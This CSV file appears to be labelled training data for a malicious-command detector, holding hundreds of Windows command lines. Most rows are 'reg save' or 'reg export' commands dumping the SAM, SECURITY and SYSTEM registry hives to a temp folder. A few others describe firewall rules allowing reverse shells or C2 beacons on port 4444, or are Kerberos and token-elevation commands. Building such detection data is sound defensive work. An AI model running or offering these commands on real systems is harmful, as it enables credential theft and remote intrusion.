text,label
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\l0ywuvtq.save""",1
reg save hklm\system c:\windows\temp\pxvx0m18.save,1
reg save hklm\system c:\windows\temp\ewcju4bp.save,1
reg save hklm\system c:\windows\temp\trlf8zcx.save,1
reg export hklm\security c:\windows\temp\lh9xfet4.save,1
reg save hklm\security c:\windows\temp\lsrsfumi.save,1
reg export hklm\sam c:\windows\temp\bavejuiz.save,1
reg save hklm\sam c:\windows\temp\fqtcyrxp.save,1
reg save hklm\system c:\windows\temp\0pi6jopr.save,1
reg save hklm\system c:\windows\temp\9466cb2c.save,1
reg save hklm\security c:\windows\temp\7tyra69s.save,1
reg save hklm\sam c:\windows\temp\tjxu4qm0.save,1
reg export hklm\security c:\windows\temp\ey32zggj.save,1
reg export hklm\sam c:\windows\temp\ceu4zpt2.save,1
reg export hklm\security c:\windows\temp\1kzw5hqe.save,1
reg export hklm\system c:\windows\temp\0kffd9cp.save,1
reg export hklm\sam c:\windows\temp\8c0sm6sw.save,1
reg save hklm\sam c:\windows\temp\56z06212.save,1
reg export hklm\sam c:\windows\temp\gnuqx8go.save,1
reg save hklm\security c:\windows\temp\rnc6x03h.save,1
reg export hklm\system c:\windows\temp\y5c6puz5.save,1
reg save hklm\sam c:\windows\temp\vhvf662c.save,1
reg   save   hklm\system   c:\windows\temp\ya4ixmdn.save,1
reg export hklm\sam c:\windows\temp\z4589low.save,1
reg save hklm\system c:\windows\temp\8w1pn90l.save,1
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\7kjwe20i.save""",1
reg save hklm\system c:\windows\temp\lzfxbksz.save,1
reg save hklm\system c:\windows\temp\prpzmguj.save,1
reg export hklm\system c:\windows\temp\u9c8z1d6.save,1
reg export hklm\sam c:\windows\temp\5a9ephzw.save,1
reg export hklm\sam c:\windows\temp\308viqcb.save,1
reg save hklm\system c:\windows\temp\uug8s638.save,1
reg export hklm\security c:\windows\temp\l3cdwhmc.save,1
reg export hklm\system c:\windows\temp\flmdmucp.save,1
reg export hklm\security c:\windows\temp\asew27xl.save,1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\02nahyce.save""",1
reg save hklm\system c:\windows\temp\y28030kl.save,1
reg export hklm\sam c:\windows\temp\6zf4xjjs.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\ac7nc1e7.save""",1
reg save hklm\system c:\windows\temp\feopcgf4.save,1
reg export hklm\system c:\windows\temp\qb3m2fst.save,1
reg export hklm\system c:\windows\temp\25803ysb.save,1
reg export hklm\security c:\windows\temp\x0r34aze.save,1
reg save hklm\system c:\windows\temp\ovo4kta3.save,1
reg save hklm\sam c:\windows\temp\v5xlhep7.save,1
reg export hklm\security c:\windows\temp\j5iu315v.save,1
reg export hklm\security c:\windows\temp\nu0hm9k4.save,1
reg save hklm\system c:\windows\temp\4q7w99vg.save,1
reg save hklm\system c:\windows\temp\slim38ez.save,1
"cmd.exe /c ""reg query hkcu\console""",0
reg export hklm\system c:\windows\temp\cg35pcwv.save,1
reg export hklm\system c:\windows\temp\uv0bh8p7.save,1
reg export hklm\sam c:\windows\temp\kdd48cg3.save,1
reg export hklm\security c:\windows\temp\g5c4gbsz.save,1
reg save hklm\sam c:\windows\temp\hc43zw22.save,1
reg save hklm\security c:\windows\temp\dygo066p.save,1
reg export hklm\security c:\windows\temp\dsvkhz7m.save,1
reg save hklm\system c:\windows\temp\z1by422p.save,1
reg export hklm\system c:\windows\temp\o482r1u4.save,1
reg   export   hklm\sam   c:\windows\temp\4o69a73r.save,1
reg export hklm\security c:\windows\temp\uugulql0.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\4ffjv4m3.save""",1
reg save hklm\system c:\windows\temp\vgzgzlta.save,1
reg save hklm\security c:\windows\temp\c7e8dwwh.save,1
reg save hklm\sam c:\windows\temp\wamwrseg.save,1
reg export hklm\security c:\windows\temp\acg9ywus.save,1
reg export hklm\system c:\windows\temp\iic9jijn.save,1
reg export hklm\system c:\windows\temp\ylav1pda.save,1
reg export hklm\sam c:\windows\temp\rgbsf24u.save,1
reg save hklm\security c:\windows\temp\ovljc79w.save,1
reg export hklm\security c:\windows\temp\tuxm7lml.save,1
reg export hklm\security c:\windows\temp\91o2bhh5.save,1
reg export hklm\system c:\windows\temp\qwyfrk1q.save,1
reg export hklm\sam c:\windows\temp\sdsmky1s.save,1
reg export hklm\security c:\windows\temp\1co5rd8h.save,1
reg export hklm\security c:\windows\temp\m4oq8j28.save,1
reg save hklm\system c:\windows\temp\yafskrpb.save,1
reg   export   hklm\system   c:\windows\temp\0sa9h5bl.save,1
reg save hklm\sam c:\windows\temp\8tms2bzy.save,1
reg export hklm\system c:\windows\temp\vf2dqgjt.save,1
reg export hklm\sam c:\windows\temp\9tu61gec.save,1
reg export hklm\system c:\windows\temp\d1to6ykx.save,1
reg export hklm\security c:\windows\temp\viy45t9s.save,1
reg save hklm\security c:\windows\temp\bccrsphy.save,1
reg save hklm\security c:\windows\temp\maz2sylb.save,1
reg save hklm\security c:\windows\temp\gze7srzt.save,1
reg export hklm\system c:\windows\temp\mc0f7kk3.save,1
reg export hklm\security c:\windows\temp\0qa199o9.save,1
reg export hklm\sam c:\windows\temp\fvrrzn9h.save,1
reg export hklm\security c:\windows\temp\9j0gn5cm.save,1
reg export hklm\sam c:\windows\temp\9uuiyvlq.save,1
reg export hklm\sam c:\windows\temp\iixukf2o.save,1
reg save hklm\security c:\windows\temp\ca9au0gs.save,1
reg export hklm\security c:\windows\temp\uf2091xn.save,1
reg save hklm\system c:\windows\temp\2z4i235u.save,1
reg export hklm\sam c:\windows\temp\p56lvwys.save,1
reg save hklm\sam c:\windows\temp\qenqyciy.save,1
reg save hklm\sam c:\windows\temp\u5t8jjb3.save,1
reg export hklm\system c:\windows\temp\uat6djnq.save,1
reg export hklm\system c:\windows\temp\0wkw487l.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\jdy1f5pz.save""",1
reg save hklm\sam c:\windows\temp\7qs3r5tc.save,1
reg export hklm\system c:\windows\temp\lo2o7vs6.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\uxl6jshy.save""",1
reg save hklm\sam c:\windows\temp\oxv0zvmv.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\9gf4ppnt.save""",1
reg save hklm\sam c:\windows\temp\h1f2vkyg.save,1
reg export hklm\security c:\windows\temp\q7of4s8j.save,1
reg  export  hklm\sam  c:\windows\temp\0gbbwrie.save,1
reg  export  hklm\sam  c:\windows\temp\rqtic60c.save,1
reg export hklm\security c:\windows\temp\xsd8o977.save,1
reg export hklm\sam c:\windows\temp\qkschx1t.save,1
reg save hklm\security c:\windows\temp\003kdipb.save,1
reg export hklm\system c:\windows\temp\wk854v1g.save,1
reg save hklm\sam c:\windows\temp\vqoj7vlj.save,1
reg export hklm\sam c:\windows\temp\xwkf135d.save,1
reg save hklm\system c:\windows\temp\pulctb8n.save,1
reg save hklm\sam c:\windows\temp\6pldkuzs.save,1
reg save hklm\security c:\windows\temp\xn6o6jx4.save,1
reg export hklm\security c:\windows\temp\2lm1yovz.save,1
reg save hklm\system c:\windows\temp\zvacchjb.save,1
reg export hklm\system c:\windows\temp\1f8k6zxl.save,1
reg save hklm\security c:\windows\temp\dj2hws5o.save,1
reg export hklm\sam c:\windows\temp\8ukimqt2.save,1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\ew2a8whz.save""",1
reg   export   hklm\system   c:\windows\temp\cee2y9y2.save,1
reg save hklm\security c:\windows\temp\e21e4vbp.save,1
reg export hklm\security c:\windows\temp\1hpgju8m.save,1
reg save hklm\security c:\windows\temp\ej8r9abg.save,1
reg export hklm\system c:\windows\temp\e3nj1z0h.save,1
reg save hklm\sam c:\windows\temp\10lvkg9f.save,1
reg export hklm\system c:\windows\temp\r72uglqx.save,1
reg save hklm\sam c:\windows\temp\tegvt9pu.save,1
reg export hklm\security c:\windows\temp\m3vxp4hq.save,1
reg save hklm\sam c:\windows\temp\x0m670bv.save,1
reg export hklm\sam c:\windows\temp\pjk2dtf0.save,1
reg export hklm\system c:\windows\temp\y4ha80k3.save,1
reg save hklm\system c:\windows\temp\ig89732z.save,1
reg save hklm\sam c:\windows\temp\zz4ln2bq.save,1
reg save hklm\security c:\windows\temp\k7htpf7v.save,1
reg save hklm\sam c:\windows\temp\uvi1lbjr.save,1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\system c:\windows\temp\wjk389zy.save,1
reg export hklm\security c:\windows\temp\h9crybhj.save,1
reg export hklm\sam c:\windows\temp\kt099xk2.save,1
reg save hklm\security c:\windows\temp\ukeaevnm.save,1
reg export hklm\sam c:\windows\temp\4rvvhh0a.save,1
reg save hklm\system c:\windows\temp\7j721vvg.save,1
reg save hklm\system c:\windows\temp\apo23fji.save,1
reg save hklm\security c:\windows\temp\0xyha82f.save,1
reg export hklm\security c:\windows\temp\37uhklhe.save,1
reg export hklm\security c:\windows\temp\j4pqpb8d.save,1
reg export hklm\sam c:\windows\temp\lvim5sdj.save,1
reg export hklm\sam c:\windows\temp\q5i5a0be.save,1
reg export hklm\system c:\windows\temp\nrt7wfrq.save,1
reg export hklm\system c:\windows\temp\n5xekni2.save,1
reg save hklm\security c:\windows\temp\qk31xwkt.save,1
reg export hklm\sam c:\windows\temp\ie67ozga.save,1
reg export hklm\security c:\windows\temp\kfpdnajr.save,1
reg save hklm\system c:\windows\temp\j6e2werv.save,1
reg save hklm\security c:\windows\temp\lper8ku6.save,1
reg export hklm\sam c:\windows\temp\aifh9qlo.save,1
reg save hklm\system c:\windows\temp\ywvb60c7.save,1
reg export hklm\security c:\windows\temp\1pt4uhza.save,1
reg save hklm\sam c:\windows\temp\vzo7wgua.save,1
reg save hklm\sam c:\windows\temp\bpgmi2wj.save,1
reg export hklm\system c:\windows\temp\gfdn09cz.save,1
reg save hklm\security c:\windows\temp\zl5mc1ob.save,1
reg save hklm\sam c:\windows\temp\v0iqoq0m.save,1
reg export hklm\sam c:\windows\temp\v634lt35.save,1
token::elevate,3
reg export hklm\system c:\windows\temp\3471rbji.save,1
reg save hklm\sam c:\windows\temp\tyt4kl8b.save,1
reg save hklm\system c:\windows\temp\phh3tzea.save,1
reg export hklm\system c:\windows\temp\j920ddxy.save,1
reg export hklm\system c:\windows\temp\hp0zexyy.save,1
reg export hklm\security c:\windows\temp\gg6yu5cr.save,1
reg export hklm\system c:\windows\temp\y66esf88.save,1
reg export hklm\sam c:\windows\temp\i8akll3x.save,1
explorer.exe,0
reg save hklm\sam c:\windows\temp\e3jrei7b.save,1
reg save hklm\security c:\windows\temp\ff2ghtd9.save,1
reg export hklm\sam c:\windows\temp\lenpwbtq.save,1
reg save hklm\system c:\windows\temp\4qp45nom.save,1
reg save hklm\system c:\windows\temp\oiquh4ko.save,1
reg export hklm\security c:\windows\temp\bv9hvkhk.save,1
reg export hklm\security c:\windows\temp\taqmnt8t.save,1
reg   export   hklm\system   c:\windows\temp\anrh2apn.save,1
reg save hklm\sam c:\windows\temp\t9w5mf50.save,1
reg export hklm\system c:\windows\temp\g2zn15dx.save,1
reg save hklm\system c:\windows\temp\jfo1jl97.save,1
reg save hklm\sam c:\windows\temp\e3pn4awz.save,1
reg save hklm\security c:\windows\temp\cyttzj2s.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
reg export hklm\security c:\windows\temp\z9zzcgax.save,1
reg export hklm\system c:\windows\temp\x7flriqb.save,1
reg save hklm\security c:\windows\temp\lmncjt79.save,1
reg export hklm\security c:\windows\temp\qknywx8p.save,1
reg export hklm\system c:\windows\temp\1cceptug.save,1
reg save hklm\system c:\windows\temp\hkf9pqdx.save,1
reg   save   hklm\system   c:\windows\temp\p3cxt8qs.save,1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\4kpybm4e.save""",1
reg save hklm\system c:\windows\temp\jhvjihjp.save,1
reg export hklm\security c:\windows\temp\yuzzkfbq.save,1
reg save hklm\system c:\windows\temp\81ucp7kt.save,1
reg save hklm\security c:\windows\temp\6zd9hov0.save,1
reg export hklm\system c:\windows\temp\uvsecn67.save,1
reg export hklm\security c:\windows\temp\qjnujhfz.save,1
reg export hklm\security c:\windows\temp\3y6icjrq.save,1
reg save hklm\security c:\windows\temp\wzk8h2sz.save,1
reg export hklm\sam c:\windows\temp\oy3tkxo8.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\7iok6eug.save""",1
reg export hklm\system c:\windows\temp\eo6ri4np.save,1
dir  c:\users,0
reg save hklm\system c:\windows\temp\drv718re.save,1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\7sr071ew.save""",1
reg save hklm\system c:\windows\temp\uiwd0ew6.save,1
reg save hklm\system c:\windows\temp\ddbbshhl.save,1
reg export hklm\sam c:\windows\temp\1vrksc4h.save,1
reg save hklm\system c:\windows\temp\weqi5pks.save,1
reg export hklm\security c:\windows\temp\5u6pfp16.save,1
reg export hklm\security c:\windows\temp\06och9sl.save,1
reg save hklm\sam c:\windows\temp\hzmxym2s.save,1
reg export hklm\system c:\windows\temp\xq8zhy02.save,1
reg export hklm\system c:\windows\temp\fgjjdo8m.save,1
reg save hklm\system c:\windows\temp\wqbmf0th.save,1
reg export hklm\sam c:\windows\temp\xy2djkq2.save,1
reg save hklm\system c:\windows\temp\li105j3b.save,1
reg export hklm\system c:\windows\temp\hi1ftqgf.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\v35hb2g5.save""",1
reg save hklm\system c:\windows\temp\btk8fcyq.save,1
reg export hklm\security c:\windows\temp\wg4v440t.save,1
reg save hklm\sam c:\windows\temp\ialra3mp.save,1
reg export hklm\sam c:\windows\temp\vtypw0lb.save,1
reg save hklm\system c:\windows\temp\h57t1hxu.save,1
reg save hklm\system c:\windows\temp\qxhuh3gs.save,1
reg save hklm\security c:\windows\temp\mix6580a.save,1
reg save hklm\system c:\windows\temp\5s97ozgx.save,1
reg export hklm\security c:\windows\temp\nu7yrvwa.save,1
reg save hklm\security c:\windows\temp\q6q9eco4.save,1
reg export hklm\security c:\windows\temp\oa52dg22.save,1
reg export hklm\sam c:\windows\temp\730qrxyf.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\bthszfcz.save""",1
reg save hklm\security c:\windows\temp\78g6c96a.save,1
reg export hklm\sam c:\windows\temp\9ge9cnam.save,1
reg save hklm\sam c:\windows\temp\x78we4nd.save,1
reg export hklm\security c:\windows\temp\tk67b3o5.save,1
reg export hklm\system c:\windows\temp\etjybeag.save,1
reg export hklm\security c:\windows\temp\ikrwujrr.save,1
reg export hklm\security c:\windows\temp\7n80t2cj.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\leramu1j.save""",1
reg export hklm\system c:\windows\temp\fqa3c1sw.save,1
reg save hklm\sam c:\windows\temp\10lietaw.save,1
reg  export  hklm\sam  c:\windows\temp\lz6qusaq.save,1
reg save hklm\system c:\windows\temp\qv48tfcn.save,1
reg save hklm\security c:\windows\temp\p6hvkm1q.save,1
reg save hklm\security c:\windows\temp\k2b00np7.save,1
reg export hklm\sam c:\windows\temp\8l76byfz.save,1
reg save hklm\sam c:\windows\temp\f9ggs1yn.save,1
reg save hklm\sam c:\windows\temp\c4ibl7sp.save,1
reg export hklm\sam c:\windows\temp\frpaph0p.save,1
reg save hklm\security c:\windows\temp\52jdp84e.save,1
reg export hklm\system c:\windows\temp\lchc7y7o.save,1
reg export hklm\security c:\windows\temp\ywq2yuk3.save,1
reg save hklm\sam c:\windows\temp\jdt46fff.save,1
reg save hklm\security c:\windows\temp\twm00xkx.save,1
reg save hklm\sam c:\windows\temp\uuxch3ex.save,1
reg export hklm\sam c:\windows\temp\xe57xdmb.save,1
reg export hklm\sam c:\windows\temp\ppormek0.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\ph189wmg.save""",1
reg export hklm\system c:\windows\temp\7dlp6uae.save,1
reg save hklm\security c:\windows\temp\6hfdof6k.save,1
reg export hklm\system c:\windows\temp\rawojbm7.save,1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
reg export hklm\security c:\windows\temp\omlodqjh.save,1
reg save hklm\sam c:\windows\temp\b6bxi5nl.save,1
reg export hklm\system c:\windows\temp\4xk5gu26.save,1
reg save hklm\security c:\windows\temp\utblrx4h.save,1
reg save hklm\sam c:\windows\temp\buboutah.save,1
reg save hklm\system c:\windows\temp\wlb61vb9.save,1
reg export hklm\system c:\windows\temp\nddh3b6a.save,1
reg save hklm\system c:\windows\temp\o9xv2n87.save,1
reg save hklm\security c:\windows\temp\hbpiyi22.save,1
reg export hklm\security c:\windows\temp\1cuj4yiw.save,1
reg save hklm\security c:\windows\temp\603z02qa.save,1
reg save hklm\system c:\windows\temp\uz1m6as5.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\vckmd5g9.save""",1
reg save hklm\sam c:\windows\temp\9mtajpfz.save,1
reg save hklm\system c:\windows\temp\tusrd7ms.save,1
reg save hklm\sam c:\windows\temp\uwj9w8a6.save,1
reg export hklm\system c:\windows\temp\8z7tasge.save,1
reg export hklm\security c:\windows\temp\f44xjomy.save,1
reg export hklm\system c:\windows\temp\unjoo64e.save,1
reg export hklm\sam c:\windows\temp\2l8d8dp6.save,1
reg save hklm\system c:\windows\temp\dg2xg4no.save,1
reg export hklm\system c:\windows\temp\sjnji6c8.save,1
"cmd.exe /c ""klist   get   krbtgt/domain.local""",3
reg save hklm\system c:\windows\temp\um7wlq8z.save,1
reg save hklm\system c:\windows\temp\ijzoy4pl.save,1
reg save hklm\sam c:\windows\temp\ozar8zxx.save,1
reg export hklm\sam c:\windows\temp\0705vtk4.save,1
reg save hklm\sam c:\windows\temp\wuci0n3t.save,1
reg export hklm\system c:\windows\temp\nvxv7t09.save,1
reg export hklm\security c:\windows\temp\7o7kt9ke.save,1
reg export hklm\sam c:\windows\temp\pe8hrz9r.save,1
reg save hklm\sam c:\windows\temp\47jwm0bj.save,1
reg save hklm\system c:\windows\temp\62sarozr.save,1
reg save hklm\sam c:\windows\temp\p3r5gs32.save,1
reg save hklm\security c:\windows\temp\8pmuo3te.save,1
reg save hklm\system c:\windows\temp\l27f8617.save,1
reg export hklm\system c:\windows\temp\6c3q4xd8.save,1
reg export hklm\system c:\windows\temp\myjah0oe.save,1
reg save hklm\system c:\windows\temp\yvkpjs0y.save,1
reg export hklm\sam c:\windows\temp\fojzow4l.save,1
reg save hklm\security c:\windows\temp\5mtcidvh.save,1
reg  export  hklm\system  c:\windows\temp\zapmyf7j.save,1
reg save hklm\sam c:\windows\temp\hyiz0sl3.save,1
reg export hklm\security c:\windows\temp\has8tmiw.save,1
reg save hklm\system c:\windows\temp\08xoizfi.save,1
reg save hklm\security c:\windows\temp\9myij5hy.save,1
reg export hklm\sam c:\windows\temp\nro8oiph.save,1
reg save hklm\sam c:\windows\temp\6wepjfr6.save,1
reg export hklm\security c:\windows\temp\9jxdt9wr.save,1
reg save hklm\system c:\windows\temp\v8fpknnu.save,1
reg save hklm\sam c:\windows\temp\prf2rkq0.save,1
reg export hklm\system c:\windows\temp\dbehy30j.save,1
reg export hklm\sam c:\windows\temp\21iajhf7.save,1
reg export hklm\system c:\windows\temp\q5wdm70v.save,1
reg export hklm\security c:\windows\temp\dh3pfjip.save,1
reg save hklm\system c:\windows\temp\v7ejowjg.save,1
reg save hklm\sam c:\windows\temp\rmsp7wcz.save,1
reg save hklm\system c:\windows\temp\p36ynx1r.save,1
reg export hklm\sam c:\windows\temp\t5cwfd33.save,1
reg export hklm\system c:\windows\temp\6t9prx8d.save,1
reg save hklm\security c:\windows\temp\a59rb0cl.save,1
reg  save  hklm\security  c:\windows\temp\0660warv.save,1
reg save hklm\system c:\windows\temp\lojl4qvg.save,1
reg export hklm\security c:\windows\temp\lqnmy13s.save,1
reg export hklm\security c:\windows\temp\t15vzv58.save,1
reg save hklm\sam c:\windows\temp\arb69woj.save,1
reg export hklm\security c:\windows\temp\3ysipy4e.save,1
reg export hklm\system c:\windows\temp\391toz6k.save,1
reg export hklm\system c:\windows\temp\rsrfd7z9.save,1
reg  export  hklm\sam  c:\windows\temp\ehyd7g8d.save,1
reg export hklm\system c:\windows\temp\0v6ybdx3.save,1
reg save hklm\security c:\windows\temp\jg4mhzpu.save,1
reg save hklm\system c:\windows\temp\2k8yl2ex.save,1
reg export hklm\sam c:\windows\temp\w0bjx2mh.save,1
reg save hklm\sam c:\windows\temp\ls6fgq3w.save,1
reg export hklm\security c:\windows\temp\1f0lfjf1.save,1
reg export hklm\sam c:\windows\temp\k9v2z8g3.save,1
reg save hklm\sam c:\windows\temp\3v7t73fw.save,1
reg save hklm\security c:\windows\temp\k8d1nqab.save,1
reg   save   hklm\sam   c:\windows\temp\17wm12zk.save,1
reg export hklm\sam c:\windows\temp\ea57mjvp.save,1
reg export hklm\sam c:\windows\temp\nddqjpgc.save,1
reg save hklm\security c:\windows\temp\dde0k8jc.save,1
reg save hklm\system c:\windows\temp\l8m96qdw.save,1
reg save hklm\security c:\windows\temp\y5unsfs7.save,1
reg export hklm\sam c:\windows\temp\l9fws56d.save,1
reg export hklm\system c:\windows\temp\jg9lwhnn.save,1
reg export hklm\system c:\windows\temp\dq9emy5p.save,1
reg export hklm\sam c:\windows\temp\h1qrbxvt.save,1
reg export hklm\security c:\windows\temp\5z856l1n.save,1
reg export hklm\sam c:\windows\temp\yjsfwzd2.save,1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\5r4y1kda.save""",1
reg export hklm\security c:\windows\temp\7b9yur53.save,1
reg save hklm\security c:\windows\temp\zb8wvk1x.save,1
reg save hklm\system c:\windows\temp\vsbxw3f0.save,1
reg save hklm\security c:\windows\temp\quphfgzw.save,1
reg save hklm\sam c:\windows\temp\j1t44ga6.save,1
reg export hklm\system c:\windows\temp\3m9njhds.save,1
reg export hklm\security c:\windows\temp\ax4le43g.save,1
reg export hklm\sam c:\windows\temp\hsfcptg7.save,1
reg export hklm\security c:\windows\temp\965fdw9n.save,1
reg export hklm\system c:\windows\temp\ltu4ufs8.save,1
reg export hklm\system c:\windows\temp\eqhlglyl.save,1
reg save hklm\system c:\windows\temp\t1yvohzj.save,1
reg export hklm\system c:\windows\temp\4lja88po.save,1
reg export hklm\system c:\windows\temp\wugars06.save,1
reg save hklm\system c:\windows\temp\7yu6n0s8.save,1
reg export hklm\system c:\windows\temp\6zc4hmzc.save,1
reg export hklm\system c:\windows\temp\y96hbhef.save,1
reg save hklm\security c:\windows\temp\g6gf75sf.save,1
reg export hklm\sam c:\windows\temp\xco8c5wj.save,1
reg export hklm\sam c:\windows\temp\acl80ky6.save,1
reg save hklm\security c:\windows\temp\mtlpuyre.save,1
reg save hklm\security c:\windows\temp\rai9eg7d.save,1
reg save hklm\security c:\windows\temp\k858ect6.save,1
reg export hklm\system c:\windows\temp\4yejrz5l.save,1
reg save hklm\security c:\windows\temp\rw2num28.save,1
reg save hklm\sam c:\windows\temp\q78ejyjb.save,1
reg export hklm\security c:\windows\temp\4skmzcoi.save,1
reg save hklm\system c:\windows\temp\k3bgdpz1.save,1
reg export hklm\security c:\windows\temp\1pqnazys.save,1
reg export hklm\security c:\windows\temp\zj7ygvjq.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\kt5gduiz.save""",1
reg export hklm\system c:\windows\temp\1794mj96.save,1
reg export hklm\system c:\windows\temp\ppjo5vui.save,1
reg  save  hklm\sam  c:\windows\temp\emedvxa2.save,1
reg save hklm\security c:\windows\temp\4gkr0m1j.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\6zbj9zzo.save""",1
reg   export   hklm\sam   c:\windows\temp\97yvf71o.save,1
reg export hklm\security c:\windows\temp\dfpupbs5.save,1
reg save hklm\sam c:\windows\temp\ykljmrx5.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\q8d76nxr.save""",1
reg save hklm\system c:\windows\temp\83ng87t0.save,1
reg export hklm\sam c:\windows\temp\3dl1j7bi.save,1
reg save hklm\system c:\windows\temp\5ettf3vd.save,1
reg export hklm\security c:\windows\temp\d0s8o71h.save,1
reg save hklm\sam c:\windows\temp\pbqyqfhr.save,1
reg export hklm\sam c:\windows\temp\qe50hupc.save,1
reg save hklm\security c:\windows\temp\l3l1rsph.save,1
reg save hklm\security c:\windows\temp\cp6horsj.save,1
reg export hklm\sam c:\windows\temp\lrp1diil.save,1
reg save hklm\security c:\windows\temp\u8p805vt.save,1
reg export hklm\sam c:\windows\temp\s5r4o5q0.save,1
reg export hklm\security c:\windows\temp\t836169r.save,1
reg save hklm\system c:\windows\temp\co74wyn7.save,1
reg save hklm\system c:\windows\temp\h2f6lnw6.save,1
reg save hklm\sam c:\windows\temp\88f709jo.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\8vk9ygh9.save""",1
reg save hklm\security c:\windows\temp\oorn4in8.save,1
reg export hklm\sam c:\windows\temp\ekkfwy9i.save,1
reg save hklm\system c:\windows\temp\nasxgd10.save,1
reg export hklm\sam c:\windows\temp\gqn2d2ox.save,1
reg export hklm\security c:\windows\temp\8jci44gu.save,1
reg save hklm\system c:\windows\temp\yf2c32bq.save,1
reg save hklm\system c:\windows\temp\j70wkm16.save,1
reg save hklm\sam c:\windows\temp\eufyvieq.save,1
reg save hklm\sam c:\windows\temp\rvox3c8s.save,1
reg export hklm\system c:\windows\temp\30469o08.save,1
reg save hklm\system c:\windows\temp\65txgiod.save,1
reg export hklm\system c:\windows\temp\vvy3hr1h.save,1
reg export hklm\system c:\windows\temp\9ufjwr4y.save,1
reg save hklm\security c:\windows\temp\31jk55xf.save,1
reg save hklm\security c:\windows\temp\ivfukj3k.save,1
reg save hklm\sam c:\windows\temp\konpwin3.save,1
reg save hklm\system c:\windows\temp\gw9p1hvn.save,1
reg export hklm\sam c:\windows\temp\3s86uxe0.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg export hklm\system c:\windows\temp\t3iqwju1.save,1
reg export hklm\sam c:\windows\temp\q8hf1sdd.save,1
reg save hklm\security c:\windows\temp\j3bscv6b.save,1
reg export hklm\security c:\windows\temp\j5k4r3nu.save,1
reg export hklm\security c:\windows\temp\2evyy41r.save,1
"powershell -nop -c ""netsh dump > netconfig.txt""",0
reg export hklm\security c:\windows\temp\9wxrck1f.save,1
reg export hklm\system c:\windows\temp\4be0kebc.save,1
reg export hklm\system c:\windows\temp\jhls7tjz.save,1
reg export hklm\security c:\windows\temp\spurg5bj.save,1
reg save hklm\sam c:\windows\temp\ng7pkrv0.save,1
reg save hklm\security c:\windows\temp\qz1lmf7q.save,1
reg save hklm\security c:\windows\temp\af78ix3u.save,1
reg save hklm\security c:\windows\temp\17ts615t.save,1
reg export hklm\system c:\windows\temp\2l330ze9.save,1
reg export hklm\security c:\windows\temp\sh80f02j.save,1
reg export hklm\security c:\windows\temp\v9mya8fm.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\l63nadkc.save""",1
reg export hklm\sam c:\windows\temp\atd5s6ia.save,1
reg save hklm\system c:\windows\temp\1n6cd5il.save,1
reg export hklm\sam c:\windows\temp\h8u6rjfy.save,1
reg save hklm\sam c:\windows\temp\lr3712lv.save,1
reg save hklm\security c:\windows\temp\munljo40.save,1
reg save hklm\system c:\windows\temp\ueydtpro.save,1
reg  export  hklm\security  c:\windows\temp\ob8rixuz.save,1
